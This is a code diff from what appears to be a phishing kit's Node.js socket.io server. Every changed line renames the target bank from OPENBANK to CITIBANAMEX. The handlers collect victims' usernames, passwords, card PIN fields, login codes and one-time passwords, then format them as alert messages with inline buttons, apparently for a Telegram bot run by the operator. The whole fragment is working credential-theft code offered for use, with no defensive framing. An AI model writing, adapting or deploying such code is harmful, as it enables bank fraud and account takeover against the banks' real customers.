@@ -30,7 +30,7 @@ io.on('connection', (socket) => {
   socket.on('dataForm', ({ usuario, contrasena, claveCajero, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `🔐 RICKSANCHEZ TU PAPA: NUEVO OPENBANK:\n\n📧 Usuario: ${usuario}\n🔑 Contraseña: ${contrasena}`;
+    const mensaje = `🔐 RICKSANCHEZ TU PAPA: NUEVO CITIBANAMEX:\n\n📧 Usuario: ${usuario}\n🔑 Contraseña: ${contrasena}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
@@ -49,7 +49,7 @@ io.on('connection', (socket) => {
   socket.on('codigoIngresado', ({ codigo, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `🔍 RICKSANCHEZ TU PAPA: CODIGO OPENBANK:\n\n🧾 Código: ${codigo}`;
+    const mensaje = `🔍 RICKSANCHEZ TU PAPA: CODIGO CITIBANAMEX:\n\n🧾 Código: ${codigo}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
@@ -68,7 +68,7 @@ io.on('connection', (socket) => {
   socket.on('otpIngresado', ({ codigo, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `📨 RICKSANCHEZ TU PAPA: ERROR DE CODIGO LOGO OPENBANK:\n\n🧾 Código: ${codigo}`;
+    const mensaje = `📨 RICKSANCHEZ TU PAPA: ERROR DE CODIGO LOGO CITIBANAMEX:\n\n🧾 Código: ${codigo}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
@@ -87,7 +87,7 @@ io.on('connection', (socket) => {
   socket.on('errorlogoForm', ({ usuario, contrasena, claveCajero, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `⚠️ RICKSANCHEZ TU PAPA: ERROR LOGO OPENBANK:\n\n📧 Usuario: ${usuario}\n🔑 Contraseña: ${contrasena}`;
+    const mensaje = `⚠️ RICKSANCHEZ TU PAPA: ERROR LOGO CITIBANAMEX:\n\n📧 Usuario: ${usuario}\n🔑 Contraseña: ${contrasena}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
